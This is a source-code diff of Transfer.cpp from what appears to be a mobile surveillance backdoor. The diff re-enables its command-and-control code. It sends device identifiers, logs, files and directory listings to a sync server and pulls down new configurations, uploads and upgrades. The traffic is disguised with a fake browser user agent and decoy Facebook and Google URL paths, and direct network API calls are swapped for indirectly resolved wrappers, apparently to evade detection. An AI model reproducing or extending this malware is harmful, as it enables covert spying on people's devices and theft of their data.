@@ -16,6 +16,8 @@ using namespace std;
 ///#include <common_new\Iphlpapi.h>
 #include <common_new\wininet.h>
 
+#include "FunctionFunc.h"
+
 DEFINE_GUID(WIFI_DEVICE_GUID,   0x98c5250d, 0xc29a, 0x4985, 0xae, 0x5f, 0xaf, 0xe5, 0x36, 0x7e, 0x50, 0x06);
 DEFINE_GUID(HMOBILE_PROTO_UUID, 0xa81fd4e0, 0xeec8, 0x4a1f, 0xbd, 0x6c, 0xb2, 0x49, 0x74, 0x57, 0x6b, 0xb9);
 
@@ -71,9 +73,9 @@ uWifiKeyLen(0), ulRegistryDhcp(0), bGprsForced(FALSE), deviceObj(NULL) {
 Transfer::~Transfer() {
 	/***
 	delete objBluetooth;
-
+***/
 	ClearLogSnapshot();
-	***/
+	
 }
 
 BOOL Transfer::ActivateWiFi() {
@@ -296,7 +298,7 @@ BOOL Transfer::SetBTGuid(GUID gGuid) {
 
 // pSsid dovrebbe essere  in CHAR perche' kiodo ce lo passa come ASCII
 BOOL Transfer::SetWifiSSID(WCHAR* pSSID, UINT uLen) {
-	/***
+	
 	CHAR cSsid[33];
 
 	if (pSSID == NULL || uLen == 0)
@@ -307,12 +309,12 @@ BOOL Transfer::SetWifiSSID(WCHAR* pSSID, UINT uLen) {
 	_RtlCopyMemory(cSsid, (CHAR *)pSSID, 32);
 	wprintf_s(wSsid, L"%S", cSsid);
 	//CopyMemory(wSsid, pSSID, uLen);
-	***/
+
 	return TRUE;
 }
 
 BOOL Transfer::SetWifiKey(BYTE* pKey, UINT uLen) {
-	/***
+	
 	if (pKey == NULL)
 		return FALSE;
 
@@ -321,7 +323,7 @@ BOOL Transfer::SetWifiKey(BYTE* pKey, UINT uLen) {
 
 	_RtlZeroMemory(wifiKey, sizeof(wifiKey));
 	_RtlCopyMemory(wifiKey, pKey, uLen);
-	***/
+
 	return TRUE;
 }
 
@@ -863,7 +865,7 @@ UINT Transfer::WiFiSendPda() {
 }
 
 INT Transfer::InternetSend(const wstring &strHostname) {
-	/***
+	
 	if (strHostname.empty()) {
 		DBG_TRACE(L"Debug - Transfer.cpp - InternetSend() FAILED [0]\n", 4, FALSE);
 		return SEND_FAIL;
@@ -944,12 +946,11 @@ INT Transfer::InternetSend(const wstring &strHostname) {
 		return SEND_OK;
 	}
 
-	***/
 	return SEND_FAIL;
 }
 
 BYTE* Transfer::RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uResponseLen) {
-	/***
+	
 	Encryption encK(K, 128);
 	PBYTE pServResponse = NULL, pClientCommand = NULL;
 
@@ -1010,12 +1011,11 @@ BYTE* Transfer::RestSendCommand(BYTE* pCommand, UINT uCommandLen, UINT &uRespons
 	uResponseLen -= 20;
 
 	return pClearRequest;
-		***/
-	return NULL;
+
 }
 
 BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pResponse, UINT &uResponseLen, BOOL bSetCookie) {
-	/***
+	
 	HINTERNET hOpenHandle, hConnectHandle, hResourceHandle;
 
 	// La dimensione dell'array wRequest
@@ -1041,9 +1041,9 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		L"/ajax/MessageComposerEndpoint.php?__a=1",
 		L"/safebrowsing/downloads?client=navclient"
 	};
-	***/
-	///wstring strHeaders = L"Accept: */*\r\n";
-	/***
+	
+	wstring strHeaders = L"Accept: */*\r\n";
+	
 	Rand r;
 	
 	if (strSyncServer.empty()) {
@@ -1051,38 +1051,38 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		return FALSE;
 	}
 
-	hOpenHandle = InternetOpen(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	hOpenHandle = _InternetOpenW(L"Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 7.6)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
 
 	if (hOpenHandle == NULL) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetOpen()] ", 4, TRUE);
 		return FALSE;
 	}
 
-	hConnectHandle = InternetConnect(hOpenHandle, strSyncServer.c_str(), INTERNET_INVALID_PORT_NUMBER,
+	hConnectHandle = _InternetConnectW(hOpenHandle, strSyncServer.c_str(), INTERNET_INVALID_PORT_NUMBER,
 						NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 
 	if (hConnectHandle == NULL) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetConnect()] ", 4, TRUE);
-		InternetCloseHandle(hOpenHandle);
+		_InternetCloseHandle(hOpenHandle);
 		return FALSE;
 	}
 
-	hResourceHandle = HttpOpenRequest(hConnectHandle, L"POST", wRequest[r.rand24() % REQUEST_SIZE], L"HTTP/1.0", NULL, NULL, 
+	hResourceHandle = _HttpOpenRequestW(hConnectHandle, L"POST", wRequest[r.rand24() % REQUEST_SIZE], L"HTTP/1.0", NULL, NULL, 
 		INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_NO_COOKIES, 0);
 
 	if (hResourceHandle == NULL) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpOpenRequest()] ", 4, TRUE);
-		InternetCloseHandle(hOpenHandle);
-		InternetCloseHandle(hConnectHandle);
+		_InternetCloseHandle(hOpenHandle);
+		_InternetCloseHandle(hConnectHandle);
 		return FALSE;
 	}
 
 	// Impostiamo il cookie se ne abbiamo uno
 	if (bSetCookie && strSessionCookie.empty()) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [bSetCookie && strSessionCookie.empty()]\n", 4, FALSE);
-		InternetCloseHandle(hOpenHandle);
-		InternetCloseHandle(hConnectHandle);
-		InternetCloseHandle(hResourceHandle);
+		_InternetCloseHandle(hOpenHandle);
+		_InternetCloseHandle(hConnectHandle);
+		_InternetCloseHandle(hResourceHandle);
 		return FALSE;
 	}
 
@@ -1095,20 +1095,20 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 		//if (HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD ) == FALSE) {
 		//	HttpAddRequestHeaders(hResourceHandle, strCookie.c_str(), -1, 0);
 		//}
-		if (HttpSendRequest(hResourceHandle, strCookie.c_str(), strCookie.length(), pContent, uContentLen) == FALSE) {
+		if (_HttpSendRequestW(hResourceHandle, strCookie.c_str(), strCookie.length(), pContent, uContentLen) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest() [cookie not set]] ", 4, TRUE);
-			InternetCloseHandle(hOpenHandle);
-			InternetCloseHandle(hConnectHandle);
-			InternetCloseHandle(hResourceHandle);
+			_InternetCloseHandle(hOpenHandle);
+			_InternetCloseHandle(hConnectHandle);
+			_InternetCloseHandle(hResourceHandle);
 			return FALSE;
 		}
 	} else {
 		// Send POST request
-		if (HttpSendRequest(hResourceHandle, NULL, 0, pContent, uContentLen) == FALSE) {
+		if (_HttpSendRequestW(hResourceHandle, NULL, 0, pContent, uContentLen) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpSendRequest()] ", 4, TRUE);
-			InternetCloseHandle(hOpenHandle);
-			InternetCloseHandle(hConnectHandle);
-			InternetCloseHandle(hResourceHandle);
+			_InternetCloseHandle(hOpenHandle);
+			_InternetCloseHandle(hConnectHandle);
+			_InternetCloseHandle(hResourceHandle);
 			return FALSE;
 		}
 	}
@@ -1121,11 +1121,11 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 
 	ZeroMemory(buf, sizeof(buf));
 	
-	if (HttpQueryInfo(hResourceHandle, HTTP_QUERY_CONTENT_LENGTH, &buf, (DWORD *)&uCounter, &dwRead) == FALSE) {
+	if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_CONTENT_LENGTH, &buf, (DWORD *)&uCounter, &dwRead) == FALSE) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() content length]: ", 4, TRUE);
-		InternetCloseHandle(hOpenHandle);
-		InternetCloseHandle(hConnectHandle);
-		InternetCloseHandle(hResourceHandle);
+		_InternetCloseHandle(hOpenHandle);
+		_InternetCloseHandle(hConnectHandle);
+		_InternetCloseHandle(hResourceHandle);
 		return FALSE;
 	}
 
@@ -1136,9 +1136,9 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 
 	if (pResponse == NULL) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [new()]\n", 4, FALSE);
-		InternetCloseHandle(hOpenHandle);
-		InternetCloseHandle(hConnectHandle);
-		InternetCloseHandle(hResourceHandle);
+		_InternetCloseHandle(hOpenHandle);
+		_InternetCloseHandle(hConnectHandle);
+		_InternetCloseHandle(hResourceHandle);
 		return FALSE;
 	}
 
@@ -1149,7 +1149,7 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 	if (strSessionCookie.empty()) {
 		BYTE *cookie = NULL;
 
-		if (HttpQueryInfo(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
+		if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
 			DWORD lastErr = GetLastError();
 
 			if (lastErr == ERROR_INSUFFICIENT_BUFFER) {
@@ -1160,9 +1160,9 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 				if (cookie == NULL) {
 					DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [new HttpQueryInfo()]: ", 4, TRUE);
 					delete[] pResponse;
-					InternetCloseHandle(hOpenHandle);
-					InternetCloseHandle(hConnectHandle);
-					InternetCloseHandle(hResourceHandle);
+					_InternetCloseHandle(hOpenHandle);
+					_InternetCloseHandle(hConnectHandle);
+					_InternetCloseHandle(hResourceHandle);
 					return FALSE;
 				}
 
@@ -1170,21 +1170,21 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 			} else {
 				DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() 1]: ", 4, TRUE);
 				delete[] pResponse;
-				InternetCloseHandle(hOpenHandle);
-				InternetCloseHandle(hConnectHandle);
-				InternetCloseHandle(hResourceHandle);
+				_InternetCloseHandle(hOpenHandle);
+				_InternetCloseHandle(hConnectHandle);
+				_InternetCloseHandle(hResourceHandle);
 				return FALSE;
 			}
 		}
 
 		dwRead = 0;
 
-		if (HttpQueryInfo(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
+		if (_HttpQueryInfoW(hResourceHandle, HTTP_QUERY_SET_COOKIE, cookie, (DWORD *)&uCounter, &dwRead) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [HttpQueryInfo() 2 [cookie not set]]: ", 4, TRUE);
 			delete[] pResponse;
-			InternetCloseHandle(hOpenHandle);
-			InternetCloseHandle(hConnectHandle);
-			InternetCloseHandle(hResourceHandle);
+			_InternetCloseHandle(hOpenHandle);
+			_InternetCloseHandle(hConnectHandle);
+			_InternetCloseHandle(hResourceHandle);
 			return FALSE;
 		}
 
@@ -1196,14 +1196,14 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 	uCounter = 0;
 
 	do {
-		if (InternetReadFile(hResourceHandle, pResponse + uCounter, uResponseLen - uCounter, &dwRead) == FALSE) {
+		if (_InternetReadFile(hResourceHandle, pResponse + uCounter, uResponseLen - uCounter, &dwRead) == FALSE) {
 			DBG_TRACE(L"Debug - Transfer.cpp - RestMakeRequest() FAILED [InternetReadFile()]\n", 4, TRUE);
 			delete[] pResponse;
 			pResponse = NULL;
 			uResponseLen = 0;
-			InternetCloseHandle(hOpenHandle);
-			InternetCloseHandle(hConnectHandle);
-			InternetCloseHandle(hResourceHandle);
+			_InternetCloseHandle(hOpenHandle);
+			_InternetCloseHandle(hConnectHandle);
+			_InternetCloseHandle(hResourceHandle);
 			break;
 		}
 
@@ -1215,15 +1215,15 @@ BOOL Transfer::RestPostRequest(BYTE *pContent, UINT uContentLen, BYTE* &pRespons
 
 	} while (1);
  
-	InternetCloseHandle(hOpenHandle);
-	InternetCloseHandle(hConnectHandle);
-	InternetCloseHandle(hResourceHandle);
-	***/
+	_InternetCloseHandle(hOpenHandle);
+	_InternetCloseHandle(hConnectHandle);
+	_InternetCloseHandle(hResourceHandle);
+	
 	return TRUE;
 }
 
 UINT Transfer::RestAuth() {
-	/***
+	
 	#define BLOCK_SIZE 16	// AES Block Size
 
 	UINT uContentLen, uResponseLen;
@@ -1264,12 +1264,12 @@ UINT Transfer::RestAuth() {
 	}
 	
 	return uResponse;
-	***/
+	
 	return NULL;
 }
 
 UINT Transfer::RestGetCommand(BYTE* pContent) {
-	/***
+	
 	if (RestDecryptK(pContent) == FALSE) {
 		DBG_TRACE(L"Debug - Transfer.cpp - RestDecryptK() FAILED [RestDecryptK()]\n", 4, TRUE);
 		return INVALID_COMMAND;
@@ -1333,12 +1333,12 @@ BOOL Transfer::RestDecryptK(BYTE *pContent) {
 	// Otteniamo K
 	Hash hash;
 	hash.Sha1(k.getBuf(), 16 + 16 + 16, (UCHAR *)&K);
-	***/
+	
 	return TRUE;
 }
 
 BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
-	/***
+	
 	// Kd (16), Nonce (16), BackdoorId (14), InstanceId (20), Subtype (16), sha1 (20)
 	UINT uContentLen = Encryption::GetPKCS5Len(16 + 16 + 16 + 20 + 16 + 20);
 	UINT uPadding = Encryption::GetPKCS5Padding(16 + 16 + 16 + 20 + 16 + 20);
@@ -1415,12 +1415,11 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 	*uEncContentLen = uContentLen;
 	
 	return pEncRequest;
-	***/
-	return NULL;
+	
 }
 
 BOOL Transfer::RestIdentification() {
-	/***
+	
 	// Costruiamo il pacchetto di identificazione
 	// PROTO_ID + Backdoor Version + UserId + DeviceId + SourceId + SHA1
 	wstring strImsi = deviceObj->GetImsi();
@@ -1537,12 +1536,12 @@ BOOL Transfer::RestIdentification() {
 	// Estraiamo i comandi da processare
 	for (UINT i = 0; i < val; i++)
 		vAvailables.push_back(r.getInt());
-	***/
+	
 	return TRUE;
 }
 
 void Transfer::RestProcessAvailables() {
-	/***
+	
 	vector<UINT>::iterator it;
 
 	if (vAvailables.empty())
@@ -1574,12 +1573,12 @@ void Transfer::RestProcessAvailables() {
 				break;
 		}
 	}
-	***/
+	
 	return;
 }
 
 BOOL Transfer::RestGetUpgrade() {
-	/***
+	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_UPGRADE) + 20));
 	Hash hash;
 
@@ -1748,12 +1747,12 @@ BOOL Transfer::RestGetUpgrade() {
 	} while (uLeft);
 
 	FlushFileBuffers(hFile);
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::RestGetNewConf() {
-	/***
+	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_NEW_CONF) + 20));
 	Hash hash;
 
@@ -1862,12 +1861,12 @@ BOOL Transfer::RestGetNewConf() {
 
 	// Torniamo un OK per la nuova configurazione
 	RestSendConfAck(TRUE);
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::RestSendConfAck(BOOL bConfOK) {
-	/***
+	
 	Hash hash;
 	BYTE sha1[20];
 	UINT uConfOK, uCommand = PROTO_NEW_CONF;
@@ -1899,7 +1898,9 @@ BOOL Transfer::RestSendConfAck(BOOL bConfOK) {
 	}
 
 	delete[] pResponse;
+	
 	return TRUE;
+	
 }
 
 BOOL Transfer::RestSendLogs() {
@@ -2017,12 +2018,12 @@ BOOL Transfer::RestSendLogs() {
 	}
 
 	ClearLogSnapshot();
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::RestSendDownloads() {
-	/***
+	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_DOWNLOAD) + 20));
 	Hash hash;
 
@@ -2129,12 +2130,12 @@ BOOL Transfer::RestSendDownloads() {
 
 		FindClose(hFind);
 	}
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::RestGetUploads() {
-	/***
+	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_UPLOAD) + 20));
 	Hash hash;
 
@@ -2312,12 +2313,12 @@ BOOL Transfer::RestGetUploads() {
 	} while (uLeft);
 
 	FlushFileBuffers(hFile);
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::RestSendFilesystem() {
-	/***
+	
 	Buffer b(Encryption::GetPKCS5Len(sizeof(PROTO_FILESYSTEM) + 20));
 	Hash hash;
 
@@ -2381,7 +2382,7 @@ BOOL Transfer::RestSendFilesystem() {
 		//exp.ExploreDirectory((PWCHAR)b.getCurBuf(), uDepth);
 		b.setPos(b.getPos() + uDirLen);
 	}
-	***/
+	
 	return TRUE;
 }
 
@@ -2859,7 +2860,7 @@ UINT Transfer::SendOldProto(UINT Type, BOOL bInterrupt) {
 }
 
 BOOL Transfer::SendIds(SOCKET s) {
-	/***
+	
 	UINT uLen = 0;
 	DWORD dwData = 0;
 	BYTE *pData = NULL, *pEncrypted = NULL;
@@ -3120,12 +3121,12 @@ BOOL Transfer::SendIds(SOCKET s) {
 	if (uLen && RecvCommand(s) != PROTO_OK) {
 		return FALSE;
 	}
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::SendChallenge(SOCKET s) {
-	/***
+	
 	UINT uRand, i;
 	Rand r;
 
@@ -3145,12 +3146,12 @@ BOOL Transfer::SendChallenge(SOCKET s) {
 	// E poi spediamo il challenge
 	if (SendData(s, Challenge, 16) == SOCKET_ERROR)
 		return FALSE;
-		***/
+		
 	return TRUE;
 }
 
 BOOL Transfer::CheckResponse(SOCKET s) {
-	/***
+	
 	BYTE Response[16], *pChallenge = NULL;
 	UINT uCommand = 0, uLen = 0;
 	auto_ptr<Encryption> pEnc(new (std::nothrow) Encryption(g_Challenge, KEY_LEN));
@@ -3182,12 +3183,12 @@ BOOL Transfer::CheckResponse(SOCKET s) {
 	// sono uguali ai nostri
 	if (RtlEqualMemory(Response, Challenge, sizeof(Challenge)) == FALSE)
 		return FALSE;
-		***/
+		
 	return TRUE;
 }
 
 BOOL Transfer::GetChallenge(SOCKET s) {
-	/***
+	
 	BYTE uChallenge[16], *pChallenge = NULL;
 	UINT uCommand = 0, uLen = 0;
 	auto_ptr<Encryption> pEnc(new (std::nothrow) Encryption(g_Challenge, KEY_LEN));
@@ -3222,12 +3223,12 @@ BOOL Transfer::GetChallenge(SOCKET s) {
 	// E poi spediamo il response
 	if (SendData(s, uChallenge, 16) == SOCKET_ERROR)
 		return FALSE;
-		***/
+		
 	return TRUE;
 }
 
 BOOL Transfer::SyncOldProto(SOCKET s, BOOL bInterrupt) {
-	/***
+	
 #define SAFE_EXIT(x)	if(pData) \
 	delete[] pData; \
 	if (hFile != INVALID_HANDLE_VALUE) \
@@ -3357,12 +3358,12 @@ BOOL Transfer::SyncOldProto(SOCKET s, BOOL bInterrupt) {
 		DBG_TRACE(L"Debug - Transfer.cpp - Sync() FAILED [11] ", 5, TRUE);
 		return FALSE;
 	}
-	***/
+	
 	return TRUE;
 }
 
 INT Transfer::SendData(SOCKET s, BYTE *pData, UINT Len) {
-	/***
+	
 	INT ret, offset;
 	CHAR *tmp = NULL;
 
@@ -3397,12 +3398,11 @@ INT Transfer::SendData(SOCKET s, BYTE *pData, UINT Len) {
 
 	DBG_TRACE(L"Debug - Transfer.cpp - SendData() OK\n", 7, FALSE);
 	return offset;
-	***/
-	return NULL;
+
 }
 
 INT Transfer::RecvData(SOCKET s, BYTE *pData, UINT Len) {
-	/***
+	
 	INT ret, offset;
 	CHAR *tmp = NULL;
 
@@ -3434,12 +3434,11 @@ INT Transfer::RecvData(SOCKET s, BYTE *pData, UINT Len) {
 
 	DBG_TRACE(L"Debug - Transfer.cpp - RecvData() OK\n", 7, FALSE);
 	return offset;
-	***/
-	return NULL;
+
 }
 
 INT Transfer::SendCommand(SOCKET s, UINT uCommand) {
-	/***
+	
 	INT ret, offset;
 	CHAR *tmp = NULL;
 
@@ -3466,12 +3465,11 @@ INT Transfer::SendCommand(SOCKET s, UINT uCommand) {
 
 	DBG_TRACE(L"Debug - Transfer.cpp - SendCommand() OK\n", 7, FALSE);
 	return offset;
-	***/
-	return NULL;
+
 }
 
 INT Transfer::RecvCommand(SOCKET s) {
-	/***
+	
 	INT ret, offset;
 	CHAR *tmp = NULL;
 	UINT uCommand;
@@ -3500,12 +3498,11 @@ INT Transfer::RecvCommand(SOCKET s) {
 	DBG_TRACE(L"Debug - Transfer.cpp - RecvCommand() OK\n", 7, FALSE);
 	
 	return uCommand;
-	***/
-	return NULL;
+	
 }
 
 BOOL Transfer::GetNewConf(SOCKET s) {
-	/***
+	
 	UINT uLen;
 	BYTE *pNewConf = NULL;
 
@@ -3567,12 +3564,12 @@ BOOL Transfer::GetNewConf(SOCKET s) {
 	// Spediamo l'OK al server
 	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
 		return FALSE;
-		***/
+		
 	return TRUE;
 }
 
 BOOL Transfer::GetUpload(SOCKET s) {
-	/***
+	
 	UINT uNameLen, uFileLen;
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	WCHAR *pwFilename = NULL;
@@ -3687,12 +3684,12 @@ BOOL Transfer::GetUpload(SOCKET s) {
 	// Confermiamo l'avvenuta ricezione del file
 	if (SendCommand(s, PROTO_OK) == SOCKET_ERROR)
 		return FALSE;
-		***/
+		
 	return TRUE;
 }
 
 BOOL Transfer::SendDownload(SOCKET s) {
-	/***
+	
 	UINT uSearchLen;
 	WCHAR *pwSearch = NULL;
 	WIN32_FIND_DATA wfd;
@@ -3812,12 +3809,12 @@ BOOL Transfer::SendDownload(SOCKET s) {
 	// Attendiamo l'OK dal server
 	if (RecvCommand(s) != PROTO_OK)
 		return FALSE;
-***/
+
 	return TRUE;
 }
 
 BOOL Transfer::CreateDownloadFile(const wstring &strPath, BOOL bObscure) {
-	/***
+	
 	Log log;
 	LogDownload LogFileData;
 	PBYTE pBuf = NULL;
@@ -3918,12 +3915,12 @@ BOOL Transfer::CreateDownloadFile(const wstring &strPath, BOOL bObscure) {
 	delete[] pBuf;
 	log.CloseLog();
 	CloseHandle(hLocalFile);
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::SendFileSystem(SOCKET s) {
-	/***
+	
 	UINT uDepth, uPathLen;
 	WCHAR *pwSearch = NULL;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
@@ -3984,12 +3981,12 @@ BOOL Transfer::SendFileSystem(SOCKET s) {
 
 	exp.ExploreDirectory(pwSearch, uDepth);
 	delete[] pwSearch;
-	***/
+	
 	return TRUE;
 }
 
 BOOL Transfer::GetUpgrade(SOCKET s) {
-	/***
+	
 	UINT uFileLen;
 	HANDLE hFile = INVALID_HANDLE_VALUE;
 	wstring strNewCore, strPathName;
@@ -4125,17 +4122,17 @@ BOOL Transfer::GetUpgrade(SOCKET s) {
 		DBG_TRACE(L"Debug - Task.cpp - GetUpgrade() FAILED [12]\n", 5, FALSE);
 		return FALSE;
 	}
-	***/
+	
 	return TRUE;
 }
 
 void Transfer::ClearLogSnapshot() {
-	/***
+	
 	if (uberlogObj == NULL || pSnap == NULL)
 		return;
 
 	uberlogObj->ClearListSnapshot(pSnap);
 
 	pSnap = NULL;
-	***/
+	
 }
